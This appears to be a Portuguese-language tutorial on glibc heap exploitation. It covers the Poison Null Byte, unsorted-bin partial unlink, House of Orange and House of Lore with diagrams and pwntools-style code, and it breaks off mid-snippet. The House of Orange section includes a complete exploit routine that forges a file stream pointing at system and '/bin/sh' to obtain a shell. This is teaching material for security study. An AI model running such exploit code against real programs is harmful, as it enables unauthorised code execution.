<div style="break-before: page; page-break-before: always;"></div><h1 id="google-poison-null-byte"><a class="header" href="#google-poison-null-byte">Google Poison Null Byte</a></h1>
<ul>
<li><a href="heap/malloc/GooglePoisonNull.html#google-poison-null-byte">Google Poison Null Byte</a></li>
<li><a href="heap/malloc/GooglePoisonNull.html#prerrequisitos">Prerrequisitos</a></li>
<li><a href="heap/malloc/GooglePoisonNull.html#ataque">Ataque</a></li>
</ul>
<p>Essa tecnica se parece com a House of Einherjar, porem nela nos 
precisávamos usar null bytes no <code>prev_size</code> e dado que overflows 
de Null Byte tendem a ocorres com strings, nos nao poderíamos 
usa-los.</p>
<p>Assim, essa tecnica é mais realista, ja que leva badchars em 
consideração. Portanto, ela ja foi usada em múltiplos ataques na 
vida real.</p>
<p>Alem disso, eles se diferenciam pois nessa tecnica o nosso Null 
byte corrompe o <code>size</code> de um <code>FREE chunk</code>... Portanto, essa 
tecnica busca criar um overlap entre dois chunks</p>
<h1 id="prerrequisitos-1"><a class="header" href="#prerrequisitos-1">Prerrequisitos</a></h1>
<p>Os prerrequisitos dessa tecnica para o chunk vitima sao o sao o 
oposto da House of Einherjar:</p>
<ul>
<li>chunk overflow
<ul>
<li>Qualquer size </li>
<li>overflow de 1 Null Byte </li>
</ul>
</li>
<li>chunk vitima 
<ul>
<li>FREE </li>
<li><code>size</code> &gt; <code>0x100</code></li>
<li><code>size</code> <strong>NAO!!!</strong> terminado em <code>0x00</code>. Ex: <code>0x410</code>, <code>0x3a0</code>... </li>
</ul>
</li>
<li>chunk consolidação
<ul>
<li>Tamanho que permita consolidação: <code>size</code> &gt;= <code>0x90</code></li>
</ul>
</li>
<li>Um chunk qualquer para prevenir consolidação com o TOP</li>
</ul>
<h1 id="ataque-1"><a class="header" href="#ataque-1">Ataque</a></h1>
<pre><code class="language-py">chunk_A = malloc(0x18)  # chunk overflow: qualquer tamanho 
chunk_B = malloc(0x308) # chunk vitima: 0x310 
chunk_C = malloc(0x98)  # chunk consolidação: size &gt;= 0x90
chunk_D = malloc(0x98)  # Prevenir consolidação TOP

free(chunk_B)


OBS: Caso o libc tenha &quot;prev vs prev size&quot; (&gt; 2.26) :
  Precisaríamos forjar um PREV_SIZE falso pro chunk_B
  (ele deve ficar na posição do prev_size caso o chunk_B ja 
  tivesse sido reduzido (pad = 0x300-0x10))

  edit(chunk_B, &quot;\x00&quot;*(0x2f0) + p16(0x300))
  free(chunk_B)

Para simplificar, vamos assumir uma versão mais antiga do libc
  

 _______________  chunk_A
|               |
|               |
|_______________| chunk_B
|       | 0x311 |  FREE: UNSORTED
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

edit(chunk_A, 0x18*b&quot;A&quot;)  # vamos assumir que o programa coloque o 
                          # NULL ao final automaticamente

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B
| AAAAA | 0x300 |  FREE: UNSORTED
|               |  SIZE ALTERADO PARA 0x300 (-0x10)
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Assim, o chunk vitima teve seu tamanho diminuído em: mod 0x100

Vamos chamar essa diferença de DIFF

Por exemplo: 
  0x310 -&gt; 0x300    DIFF=0x10
  0X4a0 -&gt; 0x400    DIFF=0xa0
  ...               DIFF=(size mod 0x100)

Essa diferença ira gerar muitos problemas!

Agora, vamos alocar um chunk que divida o B por meio de remainder

chunk_B1 = malloc(0xf8) # 0x100 por exemplo, mas poderia ser também
                        # 0x110, 0x120, ..., 0x200,...

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | 
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| resto do chunk_B
|       | 0x201 | FREE: UNSORTED
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espaço bugado de tamanho DIFF
| 0x200 |       |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|


Nao atualizou o prev_size do chunk_C como deveria, pois
deu write num endereço 0x10 (DIFF) antes do correto  
(Justamente no Espaço bugado de tamanho DIFF)

Então o prev_size do chunk_C continua = 0x310


Agora, vamos alocar um chunk que gaste o &quot;resto do chunk_B&quot;

chunk_B2 = malloc(0x1f8) # 0x200

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | 
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_B2
|       | 0x201 |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espaço bugado de tamanho DIFF
| 0x200 |   1   |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Assim como no anterior, errou a mira por 0x10 (DIFF)!

Dessa vez, nao atualiza o PREV_IN_USE do C


Portanto, por causa do PREV_USE e PREV_SIZE errados, 
se free(chunk_C), ele vai consolidar com chunk_B1 (que tem o mesmo 
endereço que o chunk_B), pois acredita que ele esta FREE


Assim, teríamos que forjar fd e bk no chunk_B1, para que ele 
passe o safe unlink! Mas nos precisaríamos de um heap leak e 
da habilidade de escrever NULLBYTES 

Para burlar isso, vamos simplesmente dar free() nele, gerando 
pointers legítimos

free(chunk_B1)

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | FREE: UNSORTED
|   FD  |   BK  | FD e BK legítimos
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_B2
|       | 0x200 | PREV_USE = 0 (porem nao importa)
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espaço bugado de tamanho DIFF
| 0x200 |   1   |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Agora podemos chamar free no chunk_C, consolidando com o chunk_B1

free(chunk_C)

Da perspectiva do MALLOC temos:
 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1 + chunk_C
| AAAAA | 0x401 | FREE: UNSORTED
|   FD  |   BK  | 
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Porem nos sabemos que o chunk_B2 continua ali! Criando um overlap

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1 + chunk_C
| AAAAA | 0x401 | FREE: UNSORTED
|   FD  |   BK  | 
|               |
|               |
|               |
|               |
|               |
|. . . . . . . .| chunk_B2               
|               |
|               |
|               |
|               | 
|               |
|               |
|               |
|               |
|. . . . . . . .|
|               |
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

E lembrando que, a nao ser que CALLOC tenha sido usado, ainda 
existe um monte de metadados largados la no meio (por exemplo, no 
espaço DIFF), ou os próprios pointers do chunk_B2

</code></pre>
<p>Agora com esse primitivo, voce poderia fazer muitas coisas, 
por exemplo, um libc leak: </p>
<ul>
<li><code>chunk_E</code> = <code>malloc</code>(<code>size chunk_B1</code>)</li>
<li><code>read</code>(<code>chunk_B2</code>)</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="unsorted-bins-partial-unlink"><a class="header" href="#unsorted-bins-partial-unlink">Unsorted bins: Partial Unlink</a></h1>
<p>Nos unsorted bins, nao é necessário fazer um unlink completo.
Quando procurando um chunk nos unsorted bins, segue o procedimento:</p>
<ul>
<li>Segue da Tail -&gt; Head</li>
<li>Conforme vai andando, <code>sort</code> os chunks no bins apropriados
<ul>
<li><code>small bins</code> ou <code>large bins</code></li>
<li>Quando ele vai ser transferido da <code>unsorted</code> para <code>small/large</code>, faz um <strong>parcial unlink</strong></li>
</ul>
</li>
<li>Caso encontre um tamanho exato <code>exact fit</code>: <code>malloc</code>
<ul>
<li>Quando vai ser alocado, faz um <strong>parcial unlink</strong> </li>
</ul>
</li>
</ul>
<blockquote>
<p>Obs: Isso é uma simplificação, ignorando <code>remainder</code> e outros fatores...</p>
</blockquote>
<p>O processo de parcial unlink é similar ao unlink completo, porem somente o bk!</p>
<pre><code> head              vitima                tail  
 _V_   bk  ___       _V_       ___       _V_ 
|   | --&gt; |   | --&gt; |   | --&gt; |   | --&gt; |   |
|___| &lt;-- |___| &lt;-- |___| &lt;-- |___| &lt;-- |___|
      fd 

            vitima.fd.bk = vitima.bk
                    copiado
 head             |---------|            tail  
 _V_       ___    |   bk    V  ___       _V_ 
|   | --&gt; |   | --&gt; ----&gt; --&gt; |   | --&gt; |   |
|___| &lt;-- |___| &lt;--   X   &lt;-- |___| &lt;-- |___|
                 fd ignorado
                     ___ 
                    |   |
                    |___| 
</code></pre>
<p>assim, nos seus UAF e semelhantes, basta somente fazer: user_data = <code>p64</code>(<code>0</code>) + <code>p64</code>(<code>target</code>)</p>
<p>Assim, temos um <code>write</code> em que <code>CONTROLAMOS O ENDEREÇO</code>, mas <strong>NAO</strong> 
controlamos o valor</p>
<p>O valor é o endereço da <code>head</code> do <code>small/large bin</code> de tamanho vitima.<code>size</code></p>
<p>Para propósitos de exploit, isso quer dizer que estamos apontando algo
para o nosso chunk... Essa técnica sera util na House Of Orange !</p>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="heap/malloc/HouseOfOrange.html#house-of-orange">House Of Orange</a></li>
<li><a href="heap/malloc/HouseOfOrange.html#teoria">Teoria</a>
<ul>
<li><a href="heap/malloc/HouseOfOrange.html#gerar-um-free-chunk">Gerar um Free Chunk</a>
<ul>
<li><a href="heap/malloc/HouseOfOrange.html#extens%C3%A3o-do-heap">Extensão do heap</a></li>
</ul>
</li>
<li><a href="heap/malloc/HouseOfOrange.html#unsorted-bins">Unsorted Bins</a></li>
<li><a href="heap/malloc/HouseOfOrange.html#corromper-_io_list_all">Corromper _IO_list_all</a></li>
</ul>
</li>
<li><a href="heap/malloc/HouseOfOrange.html#exploit">Exploit</a>
<ul>
<li><a href="heap/malloc/HouseOfOrange.html#heap-extension">Heap Extension</a></li>
<li><a href="heap/malloc/HouseOfOrange.html#unsorted-bins--io_list_all">Unsorted Bins + IO_list_all</a></li>
</ul>
</li>
</ul>
<h1 id="house-of-orange"><a class="header" href="#house-of-orange">House Of Orange</a></h1>
<h1 id="teoria-12"><a class="header" href="#teoria-12">Teoria</a></h1>
<p>O ataque da House Of Orange se consiste em:</p>
<ul>
<li>Gerar um free chunk
<ul>
<li>Por exemplo, ativando o código de extensão do heap </li>
</ul>
</li>
<li>Corromper o free chunk</li>
<li><a href="https://0xturazzi.github.io/book/heap/malloc/PartialUnlink.html">Ataque dos Unsorted Bins</a></li>
<li><a href="https://0xturazzi.github.io/book/heap/relacionados/io_list_all.html">Corromper _IO_list_all</a>
<ul>
<li>Método: Forjar chunk falso no heap</li>
</ul>
</li>
</ul>
<blockquote>
<p>OBS: Glibc &lt;= </p>
</blockquote>
<h2 id="gerar-um-free-chunk"><a class="header" href="#gerar-um-free-chunk">Gerar um Free Chunk</a></h2>
<p>Para executar esse ataque, voce vai precisar de um free chunk nos unsorted 
bins. Ele obviamente pode ser corrompido com um <code>write-after-free</code> ou overflow.</p>
<p>Porem um técnica que costuma vir combinada com a HoO é ativar o código de 
extensão do heap</p>
<h3 id="extensão-do-heap"><a class="header" href="#extensão-do-heap">Extensão do heap</a></h3>
<p>Explicada melhor em breve, porem resumindo... Corromper o top chunk com:</p>
<pre><code>PAGE_SIZE    -    usado     +      1
0x1000       soma do tamanho   PREV_INUSE
              dos chunks ja
                alocados
</code></pre>
<p>E alocar um chunk grande, fazendo com que malloc:</p>
<ul>
<li>Crie um novo heap em outra parte da memoria</li>
<li>Transforme o resto do heap antigo em um free chunk</li>
<li>Coloque FencePost chunks no final do heap antigo</li>
</ul>
<blockquote>
<p>Fencepost: Chunk de tamanho ilegal 0x10 usado para evitar que malloc leia regiões 
nao alocadas da memoria (gerando <code>SEGFAULT</code>) quando olhando os chunks para frente!</p>
</blockquote>
<p>Assim, nos conseguimos um free chunk mesmo que o programa nunca chame free 
diretamente!</p>
<h2 id="unsorted-bins"><a class="header" href="#unsorted-bins">Unsorted Bins</a></h2>
<p>O Ataque ja foi descrito em outro post, então nao vou perder muito tempo aqui,
o fato a se ressaltar é que na HoO idealmente devemos realizar o parcial unlink 
por meio de um <strong>SORT</strong> !! </p>
<p>Alem disso, apos o sort, ele precisa ser a head do seu respectivo fastbin. 
Portanto sera necessário voce preparar o heap anteriormente caso ja exista 
algo la antes...</p>
<p>Isto ocorre pois quando realizarmos o unsorted bins vamos escrever o 
<strong>ENDEREÇO DA HEAD</strong>, e o valor nesse endereço sera o nosso chunk</p>
<h2 id="corromper-_io_list_all"><a class="header" href="#corromper-_io_list_all">Corromper _IO_list_all</a></h2>
<p>O alvo do nosso unsorted bins sera o _IO_list_all</p>
<p>Porem, ele nao vai passar os checks de segurança do unlink, mas isso nao é um 
problema, pois em versões do <strong>Glibc &lt;=</strong> os <code>overflows</code> do <code>stdio</code> (e outras<br />
filestreams) ainda serão chamados, nos permitindo executar o ataque do 
IO_list_all :D</p>
<p>Assim, uma parte da <code>main arena</code> sera interpretada como uma filestream, porem 
nao passara os checks de <code>mode</code>, etcetc</p>
<p>Assim, o seu <code>_chain</code> sera seguido, e justamente nesse endereço precisamos dar 
o sort para a head mencionada anteriormente! Agora, o nosso chunk sera tratado 
como uma filestream, e nos podemos passar os checks de segurança e forjar uma 
vtable. </p>
<p>Assim ganhando a shell apos as mitigações do Glibc serem ativadas e <code>abort()</code> 
chamado, no ultimo segundo do processo de finalização!</p>
<h1 id="exploit-5"><a class="header" href="#exploit-5">Exploit</a></h1>
<h2 id="heap-extension"><a class="header" href="#heap-extension">Heap Extension</a></h2>
<p>Vamos supor que o programa tenha chunk tem tamanho <code>0x20</code> e ao 
edita-lo temos um overflow. Assim podemos criar um helper no nosso 
exploit para editar esse chunk: <code>edit_vuln()</code></p>
<p>Também vamos supor que esse foi o primeiro e único chunk, assim fazendo 
fronteira com o <code>top chunk</code>, e tornando a quantidade usada do heap = <code>0x20</code></p>
<blockquote>
<p>Para a técnica, o único requerimento é poder corromper o top chunk, essas 
condições ideais sao somente para simplificar a explicação</p>
</blockquote>
<pre><code class="language-x86asm">Allocated chunk | PREV_INUSE
Addr: 0x55bca860c000
Size: 0x21
</code></pre>
<p>Por ultimo, nos temos um helper que nos permite alocar um chunk 
grande: <code>malloc_grande()</code></p>
<p>Assim, podemos corromper o tamanho do top chunk usando:</p>
<pre><code class="language-py">usado = 0x20 # Quanto do heap ja foi usado, por exemplo 0xa0, 0xc0,...

edit_vuln(flat(
  0,
  0,
  0,
  0x1000 - usado + 1  
))

malloc_grande()
</code></pre>
<p>Agora temos um free chunk, nos unsorted bins, logo apos o chunk do 
overflow</p>
<pre><code class="language-x86asm">Allocated chunk | PREV_INUSE
Addr: 0x55bca860c000
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55bca860c020
Size: 0xfc1
fd: 0x7f06c67a6b78
bk: 0x7f06c67a6b78

Allocated chunk
Addr: 0x55bca860cfe0
Size: 0x10

Allocated chunk | PREV_INUSE
Addr: 0x55bca860cff0
Size: 0x11

Allocated chunk
Addr: 0x55bca860d000
Size: 0x00
</code></pre>
<pre><code class="language-x86asm">0x55bca860c000  0x0000000000000000  0x0000000000000021   &lt;-- Vuln Chunk
0x55bca860c010  0x0000000000000000  0x0000000000000000
0x55bca860c020  0x0000000000000000  0x0000000000000fc1   &lt;-- unsortedbin[all][0]
0x55bca860c030  0x00007f06c67a6b78  0x00007f06c67a6b78
0x55bca860c040  0x0000000000000000  0x0000000000000000
0x55bca860c050  0x0000000000000000  0x0000000000000000
0x55bca860c060  0x0000000000000000  0x0000000000000000
0x55bca860c070  0x0000000000000000  0x0000000000000000
0x55bca860c080  0x0000000000000000  0x0000000000000000
0x55bca860c090  0x0000000000000000  0x0000000000020f71  
0x55bca860c0a0  0x0000000000000000  0x0000000000000000
...
...
...
0x55bca860cfa0  0x0000000000000000  0x0000000000000000
0x55bca860cfb0  0x0000000000000000  0x0000000000000000
0x55bca860cfc0  0x0000000000000000  0x0000000000000000
0x55bca860cfd0  0x0000000000000000  0x0000000000000000
0x55bca860cfe0  0x0000000000000fc0  0x0000000000000010   &lt;-- Fenceposts
0x55bca860cff0  0x0000000000000000  0x0000000000000011
</code></pre>
<h2 id="unsorted-bins--io_list_all"><a class="header" href="#unsorted-bins--io_list_all">Unsorted Bins + IO_list_all</a></h2>
<p>Como o ataque nos unsorted bins ira causar um <code>abort</code>, ja precisamos preparar 
os dois ao mesmo tempo, criando a <code>file stream</code> falsa no chunk que também 
usamos para o unsorted bins.</p>
<pre><code class="language-py">edit(flat(
    libc.sym.system,# vtable + 0x18
    0,#                         IO_list_all | Unsorted Bin
    b&quot;/bin/sh\0&quot;,#                    flags |
    0x60 + 1,#                              | size
    0,#                                     | fd
    libc.sym._IO_list_all - 16,#            | bk (alvo)
    1,#                          write base | 
    2,#                          write ptr  |
    '\0'*8*21,
    heap - 8,#                       vtable |
))
</code></pre>
<p>E o heap fica:</p>
<pre><code class="language-x86asm">0x5653aa00f000  0x0000000000000000  0x0000000000000021   &lt;-- Vuln Chunk
0x5653aa00f010  0x00007f094febf830  0x0000000000000000  
0x5653aa00f020  0x0068732f6e69622f  0x0000000000000061   &lt;-- unsortedbin[all][0]
0x5653aa00f030  0x0000000000000000  0x00007f095021a510
0x5653aa00f040  0x0000000000000001  0x0000000000000002
0x5653aa00f050  0x0000000000000000  0x0000000000000000
0x5653aa00f060  0x0000000000000000  0x0000000000000000
0x5653aa00f070  0x0000000000000000  0x0000000000000000

O pwndbg somente le ate aqui, mas lembrando que tem aqueles 900 zeros seguido dos fenceposts
</code></pre>
<p>Ou simplificando</p>
<pre><code class="language-x86asm">0x0000000000000000  0x0000000000000021      &lt;-- Vuln Chunk
      SYSTEM        0x0000000000000000 &lt;- vtable+0x18
     /bin/sh                SIZE            &lt;-- unsortedbin[all][0]
0x0000000000000000      _IO_list_all   &lt;- Unsorted: BK
     write_base          write_ptr     
0x0000000000000000  0x0000000000000000
0x0000000000000000  0x0000000000000000
0x0000000000000000  0x0000000000000000
...
...
Algum lugar aqui o Vtable pointer
...
...
Fenceposts
</code></pre>
<p>Agora basta um malloc para fazer o unsorted chunk sofrer <strong>SORT</strong> e acionar nosso 
ataque...</p>
<p>Como o <code>abort</code> chegou a ser chamado, um backtrace, mapa da memoria, etcetc sera 
printado, para dar uma vibe mais polida para o exploit basta adicionar:</p>
<pre><code>io.recvuntil(&quot;[vdso]\n&quot;)
io.interactive()
</code></pre>
<p>Lembrando que por culpa do ataque no _IO_list_all, essa técnica so te da uma shell
50% das vezes!</p>
<p>Caso voce queira, voce pode colocar o ataque todo dentro de <code>main()</code> e fazer:</p>
<pre><code class="language-py">while True:
    try: 
        main()
    except:
        continue
    quit()
</code></pre>
<p>Assim temos:</p>
<pre><code class="language-py">def main():
  #################################
  #          Inicializar          #
  #################################

  # elf = ELF( alvo123 )
  # io = process(elf.path)
  # libc = elf.libc

  #################################
  #        Heap libc Leak        #
  #################################

  # heap = bla bla bla
  # libc.address = bla bla bla

  #################################
  #        House Of Orange        #
  #################################
  # Extender Heap
  usado = 0x20 # Quanto do heap ja foi usado, por exemplo 0xa0, 0xc0,...
  edit_vuln(flat(
    0,
    0,
    0,
    0x1000 - usado + 1  
  ))
  malloc_grande()
  # Unsorted + _IO_list_all
  edit(flat(
      libc.sym.system,# vtable + 0x18
      0,#                         IO_list_all | Unsorted Bin
      b&quot;/bin/sh\0&quot;,#                    flags |
      0x60 + 1,#                              | size
      0,#                                     | fd
      libc.sym._IO_list_all - 16,#            | bk (alvo)
      1,#                          write base | 
      2,#                          write ptr  |
      '\0'*8*21,
      heap - 8,#                       vtable |
  ))

  # Qualquer malloc agora acionaria o sort
  malloc_grande()
  io.recvuntil(&quot;[vdso]\n&quot;)
  io.interactive()


while True:
    try: 
        main()
    except:
        continue
    quit()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="house-of-lore"><a class="header" href="#house-of-lore">House of Lore</a></h1>
<ul>
<li><a href="heap/malloc/HouseOfLore.html#house-of-lore">House of Lore</a></li>
<li><a href="heap/malloc/HouseOfLore.html#unsortedbin">UnsortedBin</a>
<ul>
<li><a href="heap/malloc/HouseOfLore.html#ataque">Ataque</a></li>
<li><a href="heap/malloc/HouseOfLore.html#obs">Obs</a></li>
</ul>
</li>
<li><a href="heap/malloc/HouseOfLore.html#small-bins">Small Bins</a>
<ul>
<li><a href="heap/malloc/HouseOfLore.html#obs-1">Obs</a></li>
</ul>
</li>
<li><a href="heap/malloc/HouseOfLore.html#large-bins">Large bins</a>
<ul>
<li><a href="heap/malloc/HouseOfLore.html#bk_nextsize">bk_nextsize</a></li>
</ul>
</li>
</ul>
<p>Na house of Lore vamos colocar um chunk falso no UnsortedBin, SmallBins ou LargeBins.</p>
<p>Porem, nao iremos chamar <code>free()</code> no chunk falso (como na House 
of Spirit) ou um double free (como no fastbin dup).</p>
<p>Esse foi um dos ataques originais do malloc malleficarium</p>
<p>Ele busca alocar o chunk falso em uma area com infirmações sensíveis do 
programa e altera-las</p>
<h1 id="unsortedbin"><a class="header" href="#unsortedbin">UnsortedBin</a></h1>
<blockquote>
<p>Versão &lt; 2.29
Para a HoL nos unsortedbins, precisamos de um <code>write-after-free</code> em um chunk 
dos unsorted bins.... Seja isso por meio de um overflow, ou o programa 
permitindo alterar chunks livres...</p>
</blockquote>
<p>Isso deve te lembrar do Partial Unlink nos Unsorted Bins e da House of Orange.
Porem, nesses casos a parte importante era o write na hora da alocação, e nao 
a alocação em si, com na HoO ate usando o crash mitigação nessa alocação ao
nosso favor.</p>
<p>Porem neses caso, nos queremos que o chunk seja usável quando nos alocamos e 
que o programa nao crash... então precisaremos mudar um pouco a estrategia ...</p>
<h2 id="ataque-2"><a class="header" href="#ataque-2">Ataque</a></h2>
<p>Nos podemos usar o UAF no chunk do heap para alterar o bk, da mesma maneira que 
faríamos com o ataque dos unsortedbins...</p>
<p>Assim, vamos supor que o chunk falso sera criado no <code>username</code> (armazenado na 
<code>data</code> section)</p>
<pre><code class="language-py">change_username(flat(
    0,
    0xc1,# size
    0,#fd
    0,#bk
)) 

edit_chunk_A(flat(
    0,# fd
    elf.sym.username
))
</code></pre>
<p>Assim, o unsorted bin fica:</p>
<blockquote>
<p>head bk: chunk_A -&gt; username -&gt; 0 
Em seguida, nos poderíamos alocar o chunk_A e sem seguida o nosso chunk falso</p>
</blockquote>
<p>Porem, durante a alocação desses chunks, um ataque do unsorted bin acidental 
ocorreria, ok se mostra ok no caso do chunk_A, pois aponta para memoria valida 
( a data section aonde o chunk falso fica)</p>
<p>Entretanto, no caso do chunk falso, ele tentaria fazer um ataque dos 
unsortedbins em <code>0 + 0x10</code>, memoria invalida: SEGFAULT!!!!</p>
<p>Assim, nos precisamos garantir que o bk do chunk falso aponta para memoria 
escrevível! A solução mais fácil é aponta-lo para ele mesmo, corrompendo os 
8 bytes inúteis antes do size</p>
<pre><code class="language-py">change_username(flat(
    0,
    0xc1,# size
    0,#fd
    elf.sym.username - 0x10,#bk
)) 
</code></pre>
<p>Agora basta realizar um malloc com o size do chunk falso, e 
pronto! Nos temos um chunk na data section (ou aonde vc criou o 
chunk falso)</p>
<pre><code class="language-py">free(chunk_A)

change_username(flat(
    0,
    0xc1,# size
    0,#fd
    elf.sym.username - 0x10,#bk
))  

edit_chunk_A(flat(
    0,# fd
    elf.sym.username
))

chunk_FAKE = malloc(0xb8)
</code></pre>
<h2 id="obs"><a class="header" href="#obs">Obs</a></h2>
<p>Como nos controlamos o bk do chunk falso, podemos apontar para outro chunk 
falso, ou ate pra ele mesmo contanto que voce nao danifique o bk entre 
alocações :D</p>
<p>Voce pode ter pode ter a 8 flag acidentalmente ligada que nao interfere</p>
<p>O size precisa &lt; do que system_mem</p>
<p>o bk do chunk falso precisa apontar para memoria escrevível</p>
<p>Quando tentar encontrar sizes que ocorrem naturalmente, eles PODEM nao estar 
alinhados</p>
<h1 id="small-bins-1"><a class="header" href="#small-bins-1">Small Bins</a></h1>
<p>O ataque contra os smalls bins é bem semelhante ao dos unsorted 
bins, porem nos precisamos que antes do UAF para corromper os 
pointers, nos coloquemos (sort) o chunk no small bins...</p>
<p>Para isto basta executar um malloc que nao o aloque... por 
exemplo, caso o seu chunk seja de size <code>0xb0</code>, basta alocar um de 
tamanho &gt;= <code>0xc0</code></p>
<blockquote>
<p>Lembrando que tem outros métodos de dar SORT no chunk, 
explicados na parte de teoria</p>
</blockquote>
<p>Assim o UAF, ira corromper meta dados de smallbin, e nao de 
unsortedbin :D</p>
<p>Os small bins também usam um parcial unlink, então nos podemos 
ignorar o fd</p>
<pre><code class="language-py">change_username(flat(
    0,
    0xb1,# size
    0,#fd
    elf.sym.username - 0x10,#bk
)) 

edit_chunk_A(flat(
    0,# fd
    elf.sym.username
))
</code></pre>
<p>Por conta de de os small bins nao terem verificação no tamanho do 
chunk, voce pode colocar qualquer valor....</p>
<pre><code class="language-py">chunk_A = malloc(0x98)
malloc(0x18) #  Previvir consolidação com o TOP

free(chunk_A)

change_username(flat(
    0,
    0x00,# size
    0,#fd
    elf.sym.username - 0x10,#bk
)) 

malloc( TAMANHO DIFERENTE DO CHUNK_A ) # sort chunk_A -&gt; Small

edit_chunk_A(flat(
    0,# fd
    elf.sym.username
))

chunk_A = malloc(TAMANHO CHUNK_A)
chunk_FAKE = malloc(TAMANHO CHUNK_A))
</code></pre>
<p>Lembrando que o bk do chunk_fake ainda precisa apontar para 
memoria valida e que o voce precisa de um chunk APOS o do UAF para evitar 
consolidação com o top chunk.</p>
<p>Por ultimo, temos que enfrentar a mitigação do partial unlink duas 
vezes: quando alocar o chunk_fake e quando alocar o chunk_A </p>
<ul>
<li>o chunk_fake.fd precisa apontar para o chunk_A: chunk_A.bk -&gt; 
chunk_fake.fd -&gt; chunk_A</li>
<li>o chunk_fake.bk + 0x10 precisa apontar para o chunk_fake</li>
</ul>
<p>Assim, nos precisaremos de um heap leak do endereço do chunk_A !</p>
<pre><code class="language-py">change_username(flat(
    elf.sym.username,
    0x00,# size
    leak_chunk_A,#fd
    elf.sym.username - 0x10,#bk
)) 
</code></pre>
<p>e pronto! alocamos um chunk falso :D</p>
<h2 id="obs-1"><a class="header" href="#obs-1">Obs</a></h2>
<p>Mais difícil que o unsorted bins</p>
<p>Precisa de heap leak</p>
<p>Nao precisa ficar alinhado</p>
<p>Nao precisa de size correto</p>
<p>Pode fazer o mesmo coiso de apontar o bk do chunk_fake para outro 
chunk falso e assim por diante...</p>
<h1 id="large-bins-1"><a class="header" href="#large-bins-1">Large bins</a></h1>
<p>Para os largebins, podemos tanto atacar um skipchunk quanto um normal, 
portanto a diferença é que para skipchunks, vamos corromper o <code>bk_nextsize</code> e 
para os normais o <code>fd</code></p>
<p>Vamos começar pelos normais</p>
<p>Por ser um safe unlink, nosso chunk precisara passar pelos checks 
relacionados.</p>
<p>Alem disso malloc checa se <code>size == fd-&gt;size</code>, então o chunk falso e o chunk 
do UAF precisam ter o mesmo tamanho e possuir as mesmas flags (ex: 0x401)! 
(macro: <code>CHUNKSIZE_NOMASK</code>)</p>
<ul>
<li>fake size = uaf size</li>
<li>fd e bk validos safe unlink
<ul>
<li>chunk.fd.bk -&gt; chunk</li>
<li>chunk.bk.fd -&gt; chunk</li>
<li>Basta colocar os 2 como o endereço do chunk falso </li>
</ul>
</li>
<li>fd_nextsize = 0
<ul>
<li>se ele for NULL, o chunk <strong>NAO</strong> sera considerado skip </li>
<li>se fd_nextsize != 0 e GLIBC &gt; 2.21:</li>
<li>fd_nextsize e bk_nextsize precisariam passar safe unlink</li>
</ul>
</li>
<li>E por ultimo, o chunk do UAF nao pode ser o ultimo do largebin</li>
</ul>
<p>Seguindo o exemplo do user:</p>
<pre><code class="language-py">chunk_A = malloc(0x3f8)
malloc(0x18) # Previvir consolidação A B
chunk_B = malloc(0x3f8)
malloc(0x18) #  Previvir consolidação B TOP

free(chunk_A)
free(chunk_B)

change_username(flat(
    0,
    0x401,#size
    elf.sym.username,#fd
    elf.sym.username,#bk
    0,#fd_nextsize
    0,#bk_nextsize
)) 

malloc( 0x418 ) # sort chunk_A -&gt; large 0x400

edit_chunk_A(p64(elf.sym.username))# UAF Corromper fd

chunk_A = malloc(TAMANHO CHUNK_A)
chunk_FAKE = malloc(TAMANHO CHUNK_A))
</code></pre>
<h2 id="bk_nextsize"><a class="header" href="#bk_nextsize">bk_nextsize</a></h2>
<p>Agora, para fazer o mesmo ataque por meio do <code>bk_nextsize</code>, basta trocar por:</p>
<pre><code class="language-py">edit_chunk_A(flat(0,0,0,elf.sym.username))# UAF Corromper bk_nextsize
</code></pre>
<p>Uma vantagem, é que o chunk falso, por se assumir a operação de remainder, pode
ter um tamanho menor (ou ate mesmo MAIOR) que o chunk do UAF</p>
<p>Alem disso, nao precisamos do chunk_B, com o chunk do UAF podendo ser o ultimo.</p>
<pre><code class="language-py">chunk_A = malloc(0x3f8)
